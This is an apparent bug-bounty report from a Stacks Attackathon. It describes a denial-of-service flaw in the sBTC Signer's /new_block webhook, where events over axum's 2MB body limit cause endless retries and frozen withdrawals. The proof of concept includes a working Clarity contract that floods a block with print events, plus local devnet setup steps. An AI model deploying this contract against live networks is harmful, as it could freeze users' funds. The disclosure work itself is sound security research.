# #38111 \[BC-High] Attackers can send a very large event in a Stacks block so that the Signer can neve

**Submitted on Dec 24th 2024 at 17:11:10 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38111
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Permanent freezing of funds (fix requires hardfork)
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

The `/new_block` api of Signer receives each block of Stacks and reads the events in it. Signer uses the *axum::http* package to run the api http service. The [default payload limit](https://docs.rs/axum/latest/axum/extract/struct.DefaultBodyLimit.html) of *axum::http* is 2M.

Attackers can emit more than 2M events in a Stacks block to make the Stacks node fail to access the Signer's `/new_block`. Then the Stacks node will make requests infinitely and fail infinitely, and the Signer will never be able to obtain new Stacks block events.

## Vulnerability Details

The `axum::extract::DefaultBodyLimit` docs is as follows.

> For security reasons, `Bytes` will, by default, not accept bodies larger than 2MB. This also applies to extractors that uses `Bytes` internally such as `String`, `Json`, and `Form`.
>
> Extracted from: <https://docs.rs/axum/latest/axum/extract/struct.DefaultBodyLimit.html>

The `signer/src/api/new_block.rs::new_block_handler` code is as follows.

```rust
/// A handler of `POST /new_block` webhook events.
///
/// # Notes
///
/// The event dispatcher functionality in a stacks node attempts to send
/// the payload to all interested observers, one-by-one. If the node fails
/// to connect to one of the observers, or if the response from the
/// observer is not a 200-299 response code, then it sleeps for 1 second
/// and tries again[^1]. From the looks of it, the node will not stop
/// trying to send the webhook until there is a success. Because of this,
/// unless we encounter an error where retrying in a second might succeed,
/// we will return a 200 OK status code.
///
/// TODO: We need to be careful to only return a non success status code a
/// fixed number of times.
///
/// [^1]: <https://github.com/stacks-network/stacks-core/blob/09c4b066e25104be8b066e8f7530ff0c6df4ccd5/testnet/stacks-node/src/event_dispatcher.rs#L317-L385>
#[tracing::instrument(skip_all, name = "new-block")]
pub async fn new_block_handler(state: State<ApiState<impl Context>>, body: String) -> StatusCode {
    tracing::debug!("received a new block event from stacks-core");
    metrics::counter!(
        Metrics::BlocksObservedTotal,
        "blockchain" => STACKS_BLOCKCHAIN,
    )
    .increment(1);
```

According to the comment, we can know that Stacks node will retry infinitely until it successfully accesses the `/new_block` api of Signer.

## Impact Details

Signer will never receive events from Stacks again. The specific impacts are as follows:

1. Since it cannot receive the `WithdrawalCreate` event, the Signer will not process the user's withdrawal request. The user's sBTC will be frozen.
2. Since it cannot receive the `KeyRotation` event, the Signer will not receive the new `rotate_key`. Then the Signer will process the deposits.

Since it freezes the user's funds, but it is temporary, I consider this a **High**.

## References

None

## Proof of Concept

## Proof of Concept

1. Add some log to `signer/src/api/new_block.rs`. The log will print each new stacks block received

   ```diff
        let new_block_event: NewBlockEvent = match serde_json::from_str(&body) {
            Ok(value) => value,
            // If we are here, then we failed to deserialize the webhook body
            // into the expected type. It's unlikely that retying this webhook
            // will lead to success, so we log the error and return `200 OK` so
            // that the node does not retry the webhook.
            Err(error) => {
                tracing::error!(%body, %error, "could not deserialize POST /new_block webhook:");
                return StatusCode::OK;
            }
        };
   +    tracing::info!("@audit; new_block_event.block_height: {:?}", new_block_event.block_height);

        // Although transactions can fail, only successful transactions emit
        // sBTC print events, since those events are emitted at the very end of
   ```
2. Add a test address to `docker/stacks/stacks-regtest-miner.toml`. Please replace it with your wallet address!

   ```diff
    [[ustx_balance]]
    # This is a 2-3 multi-sig address controlled using the above three
    # addresses. The above three accounts are also in the
    # `docker/sbtc/signer/README.md` file, and the resulting multi-sig address
    # below was created using the SignerWallet struct.
    address = "SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS"
    amount = 10000000000000000
   +
   +[[ustx_balance]]
   +# Please replace it with your wallet address!
   +address = "STHKP28RMWC458D0H7TP3SR88ZSDGB7KKV7T23KV" # auditor test address
   +amount = 10000000000000000
   ```
3. Build docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
4. Wait for a while, use [sandbox](http://localhost:3020/sandbox/deploy?chain=testnet\&api=http://localhost:3999) to deploy the POC contract. If you cannot deploy, please check your wallet nonce.

   ```clar
   (define-public (run-emit-event)
     (begin
       (emit-event-1024-1024)
       (ok u1)
     )
   )

   (define-private (emit-event-1024-1024)
     (begin
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
       (emit-event-256-1024)
     )
   )

   (define-private (emit-event-256-1024)
     (begin
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
       (emit-event-64-1024)
     )
   )

   (define-private (emit-event-64-1024)
     (begin
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
       (emit-event-8-1024)
     )
   )

   (define-private (emit-event-8-1024)
     (begin
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
       (emit-event-1024)
     )
   )

   (define-private (emit-event-1024)
     (begin
       (print "ABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBBABBBBBBBBBBBBBBB")
     )
   )
   ```
5. Wait for a while, use [sandbox](http://localhost:3020/sandbox/contract-call?chain=testnet\&api=http://localhost:3999) to call the POC contract. If you cannot call, please check your wallet nonce and enable Allow Mode.
6. Then, you will find that Signer can no longer receive Stacks events.
